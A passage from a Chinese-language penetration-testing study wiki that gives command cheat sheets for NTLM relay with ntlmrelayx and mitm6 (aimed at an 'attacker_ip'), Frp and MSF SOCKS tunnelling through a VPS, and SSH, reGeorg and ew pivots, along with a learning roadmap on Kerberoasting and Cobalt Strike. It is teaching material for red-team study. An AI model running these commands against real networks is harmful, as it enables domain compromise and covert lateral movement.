ntlmrelayx.py -t smb://192.168.1.10 -smb2support -i

# ntlmrelayx (LDAP Relay -> DCSync/Add Computer)
ntlmrelayx.py -t ldap://dc.domain.com -smb2support --escalate-user target_user

# mitm6 + ntlmrelayx
mitm6 -d domain.com
ntlmrelayx.py -t ldaps://dc.domain.com -wh attacker_ip -l loot -smb2support
```

### Frp 典型配置模板

```ini
# frps.ini (VPS)
[common]
bind_port = 7000
token = strong_token
dashboard_port = 7500

# frpc.ini (攻击机作为客户端，转发 MSF 监听)
[common]
server_addr = VPS_IP
server_port = 7000
token = strong_token

[msf_listener]
type = tcp
local_ip = 127.0.0.1
local_port = 4444
remote_port = 6000
```

### MSF SOCKS 代理 + Proxychains

```bash
# MSF
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run -j

# /etc/proxychains4.conf
socks4 127.0.0.1 1080

# 使用
proxychains nmap -sT -Pn -p 80,445,3389 10.0.22.0/24
proxychains rdesktop 10.0.22.50:3389
```

### 常用隧道/代理工具速查

```bash
# SSH 动态代理
ssh -D 1080 user@jump

# SSH 远程端口转发 (反向)
ssh -R 8080:127.0.0.1:3389 user@vps

# reGeorg
python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx

# ew 多级级联
# VPS: ./ew -s rcsocks -l 1080 -e 8888
# Bridge: ./ew -s lcx_slave -d vps -e 8888 -f next -g 9999
# Target: ./ew -s ssocksd -l 9999
```

---

## 学习路线建议

1. **巩固 Kerberoasting 原理**：理解 SPN、TGS-REQ、RC4_HMAC_MD5 密钥派生、离线爆破全链路 → 实战复现 [[cobalt-strike-external-c2-smb-beacon]] 相关章节
2. **精通 NTLM Relay 变体**：掌握 LLMNR/WPAD/mitm6 投毒触发条件、Responder 配置参数、ntlmrelayx 目标协议选择 (SMB/LDAP/HTTP) 与利用后模块 (`--dump-laps`, `--add-computer`, `-i`)
3. **精通 Cobalt Strike 生命周期**：Team Server 部署 → 监听器设计 → Beacon 生成/上线/睡眠/提权/横向 → Malleable C2 Profile 定制 → 参考 [[c2-redirectors-malleable-c2-profiles]]
4. **内网代理隧道体系化**：
   - 入门：MSF `autoroute` + `socks_proxy` + Proxychains
   - 进阶：Frp 多协议/多级隧道、SSH `-D`/`-R`/`-L`、Cobalt Strike SOCKS/VPN 接口、reGeorg/ew/lcx 补充通道
   - 高阶：域前置、External C2、SMB Beacon、DNS/HTTP 隧道混合 → 参考 [[internal-network-pivoting-techniques]]、[[frp内网渗透应用]]
5. **实战靶场推荐**：
   - 单域横向：[[vulnhub-admx-new-writeup]]、[[vulnhub-pwned-writeup]]
   - 多层内网：[[vulnhub-boredhackerblog-social-network-writeup]]、[[gkctf-2021-web-writeup]] (hackme)
   - 红队演练：[[xd-security-awd-competition-strategies]]、[[xd-security-blue-team-defense]]、[[redteam-hw-opsec-guidelines]]

---

## 相关页面索引

| 页面 | 关联点 |
|------|--------|
| [[xd-security-pentest-course-curriculum]] | 完整课程大纲与资料下载 |
| [[xd-security-internal-network-penetration-notes-day67-68]] | Day67-68：SMB/WMI/PTH/PTK/PTT/委派/SPN扫描/黄金白银票据/SpoolSample/Ladon |
| [[xd-security-internal-network-penetration-notes-day71-72]] | Day71-72：ICMP/DNS/Netcat 隧道、CS-MSF 会话移交、应急响应 |
| [[xd-security-incident-response-notes]] | Day71-75 应急响应全流程与自动化工具箱 |
| [[cobalt-strike-external-c2-smb-beacon]] | CS 架构、SMB Beacon、External C2、横向移动深度解析 |
| [[internal-network-pivoting-techniques]] | Venom/Frp/SSH/CS/MSF 代理隧道横向对比与实战场景交叉引用 |
| [[frp内网渗透应用]] | Frp 四大典型场景完整配置示例 |
| [[metasploit-framework-basics-tutorial]] | MSF 安装、数据库、msfvenom、后渗透基础 |
| [[mimikatz-source-code-architecture-golden-ticket-audit]] | Mimikatz Kerberos 模块源码级分析 |
| [[named-pipe-smb-detection-sysmon]] | SMB 命名管道检测视角（蓝队对抗） |
| [[vulnhub-boredhackerblog-social-network-writeup]] | 三层内网渗透实战（Docker 逃逸→Frp 代理→横向→提权） |
| [[gkctf-2021-web-writeup]] | hackme 题目 Frp 内网穿透实战 |
| [[jumbo-internal-penetration-cheatsheet]] | Jumbo 实战内网渗透备忘录速查表 |
| [[redteam-hw-opsec-guidelines]] | 红队演练 OPSEC 标准化检查清单 |
| [[c2-redirectors-malleable-c2-profiles]] | C2 基础设施隐匿、Malleable C2 Profile、重定向器部署 |

---

> 页面维护说明：本页面基于微信公众号归档文章《XD安全渗透测试课 学习笔记 | 内网渗透(三)》及 Jumbo 实战备忘录《渗透中的内网渗透》整合，原文发布日期约 2023-04-16。如需查阅原文图片或完整命令输出，请访问原文链接。

## 来源

- [0x00实验室-202108-202304_105](../sources/0x00实验室-202108-202304_105.md)
- [226安全团队-201805-202103_05](../sources/226安全团队-201805-202103_05.md)
